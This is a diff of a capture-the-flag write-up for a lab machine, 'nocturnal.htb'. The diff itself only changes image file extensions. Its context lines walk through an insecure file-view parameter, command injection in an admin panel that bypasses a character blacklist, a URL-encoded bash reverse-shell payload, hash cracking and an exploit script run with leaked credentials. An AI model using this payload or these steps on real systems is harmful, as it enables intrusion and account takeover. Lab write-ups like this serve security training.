@@ -25,7 +25,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 I visit the port 80 it’s **nocturnal.htb**. Add the domain to `/etc/hosts` 
 
-![image.png](image.png)
+![image.png](image.webp)
 
 Register a user, you will only see a page to uploading a file
 
@@ -58,11 +58,11 @@ Access the user Amanda with `http://nocturnal.htb/view.php?username=amanda&file=
 
 Unzip the *odt* file then look at `content.xml` you will see the password inside
 
-![image.png](image%201.png)
+![image.png](image%201.webp)
 
 Login as *amanda* on the website, and go to Admin Panel
 
-![image.png](image%202.png)
+![image.png](image%202.webp)
 
 Look at `admin.php` it allows a user to execute command 
 
@@ -90,7 +90,7 @@ Meaning it will blacklist the following characters but not the `%` character. Th
 
 Zip the files by executing this in the password
 
-![image.png](image%203.png)
+![image.png](image%203.webp)
 
 ```php
 0Abash%09-i%09%3E%26%09/dev/tcp/TARGET/PORT%090%3E%261
@@ -104,7 +104,7 @@ Download the database `nocturnal_database.db`
 
 By my own choice I simply extracted the full content of the database, it has base64 texts and found this part using cyberchef. I paste it into cyberchef then chose `From Base64` and found the following
 
-![image.png](image%204.png)
+![image.png](image%204.webp)
 
 Then use a hash identifier or `hashid` it is an `md5` hash. Crack it using *john the ripper* or *hashcat*. I use *john*
 
@@ -143,6 +143,6 @@ python3 exploit.py http://127.0.0.1:8888 admin slowmotionapocalypse
 
 Then get the *root* **FLAG**
 
-![image.png](image%205.png)
+![image.png](image%205.webp)
 
-![image.png](image%206.png)
+![image.png](image%206.webp)
